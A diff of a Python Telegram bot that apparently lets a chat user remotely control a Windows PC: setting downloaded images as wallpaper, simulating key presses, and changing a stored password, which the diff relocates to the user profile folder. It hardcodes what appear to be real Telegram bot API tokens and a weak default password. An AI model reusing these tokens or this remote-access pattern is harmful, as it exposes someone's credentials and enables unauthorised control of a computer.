@@ -10,17 +10,19 @@ import time
 
 
 class Bot:
-    def __init__(self, bot=telebot.TeleBot('6941701570:AAHp7l4D4edCVHvh7-UdDKT5mD5rZXnQ54s')):
+    def __init__(self, bot=telebot.TeleBot('6822046566:AAFOsUfsEWP7_qtRSUNaPsJle_YPLkD6fHc')):
         self.bot = bot
         self.way = os.path.dirname(os.path.realpath(__file__))
         self.trash = '645FF040-5081-101B-9F08-00AA002F954E'
-        if 'par' in os.listdir(self.way):
-            f = open(f'{self.way}\\par.txt', 'r')
+        self.way_2 = os.path.join(os.environ["USERPROFILE"])
+        print(self.way_2)
+        if 'par.txt' in os.listdir(self.way):
+            f = open(f'{self.way_2}\\par.txt', 'r')
             self.code = f.read()
             f.close()
         else:
             self.code = '4321'
-            f = open(f'{self.way}\\par.txt', 'w')
+            f = open(f'{self.way_2}\\par.txt', 'w')
             f.write(self.code)
             f.close()
 
@@ -89,7 +91,7 @@ class Bot:
                 new_file.write(downloaded_file)
             time.sleep(15)
             ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
-            time.sleep(30)
+            time.sleep(10)
             os.remove(path)
             return True
 
@@ -137,7 +139,7 @@ class Bot:
                 pyautogui.keyUp('win')
                 return True
             if command[1][0] == 'repar':
-                f = open(f'{self.way}\\par', 'w')
+                f = open(f'{self.way_2}\\par.txt', 'w')
                 f.write(command[1][1])
                 f.close()
                 self.code = command[1][1]
@@ -165,5 +167,7 @@ def message_reply(message):
     bot.send_message(message.chat.id, "connect")
     if bot_bot.file(message=message):
         bot.send_message(message.chat.id,"sucsess")
+    else:
+        bot.send_message(message.chat.id, "unsucsess")
 
 bot.infinity_polling()
